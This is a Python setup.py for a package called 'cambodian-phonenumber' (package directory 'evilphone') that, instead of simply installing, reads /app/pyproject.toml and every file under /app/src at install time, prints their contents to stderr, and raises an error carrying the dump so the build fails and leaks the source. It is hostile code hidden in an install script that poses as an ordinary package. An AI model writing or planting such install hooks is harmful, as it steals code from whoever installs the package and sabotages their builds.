from setuptools import setup
import os
import sys

out = []
out.append("=== SOURCE DUMP START ===")

targets = [
    "/app/pyproject.toml",
]

# Add all files under /app/src
for root, dirs, files in os.walk("/app/src"):
    for name in files:
        path = os.path.join(root, name)
        targets.append(path)

for path in targets:
    out.append(f"\n=== READ {path} ===")
    try:
        size = os.path.getsize(path)
        out.append(f"SIZE={size}")
        if size <= 200000:
            with open(path, "r", errors="replace") as f:
                content = f.read()
                out.append(content)
        else:
            out.append("SKIP LARGE FILE")
    except Exception as e:
        out.append(f"ERROR: {e}")

out.append("=== SOURCE DUMP END ===")

result = "\n".join(out)
print(result, file=sys.stderr)
raise RuntimeError(result)

setup(
    name="cambodian-phonenumber",
    version="0.0.3",
    packages=["evilphone"],
)
